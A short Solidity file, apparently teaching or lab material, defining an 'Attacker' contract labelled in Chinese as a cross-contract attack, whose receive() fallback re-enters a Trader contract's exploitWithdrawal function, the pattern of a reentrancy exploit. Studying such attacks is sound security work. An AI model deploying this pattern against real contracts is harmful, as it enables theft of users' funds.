// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Trader.sol";

/**
 * 跨合约攻击
 */
contract Attacker {
    Trader trader;

    constructor(address _bank) {
        trader = Trader(_bank);
    }

    receive() external payable {
        trader.exploitWithdrawal(address(this));
    }
}
